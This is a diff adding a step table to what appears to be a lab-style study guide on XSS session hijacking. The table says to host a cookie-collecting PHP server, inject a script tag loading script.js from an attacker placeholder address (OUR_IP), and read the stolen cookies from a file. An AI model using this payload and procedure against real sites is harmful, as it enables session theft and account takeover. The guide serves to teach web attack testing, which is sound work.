@@ -244,6 +244,14 @@ Then test the fields one by one. Fields with strong validation, such as an email
 
 ## Session Hijacking with XSS
 
+| Order | Do | Why |
+|-------|-----|-----|
+| 1 | Write **both** files in your server folder: `script.js` + `index.php` | the server serves both |
+| 2 | **Start the PHP server:** `sudo php -S 0.0.0.0:80` | must be live so the victim can fetch script.js AND so the cookie has somewhere to land |
+| 3 | **Then inject** the payload: `<script src=http://OUR_IP/script.js></script>` | now when it fires, your server is ready to answer |
+| 4 | Wait → victim triggers it → `cat cookies.txt` | cookie arrives |
+
+
 #### Stage 1 — “Here are your 2 payload OPTIONS” (pick ONE)
 
 Once a working XSS payload and vulnerable field are identified, the payload can be changed to send the session cookie to the Attack Machine. Two common payloads are:
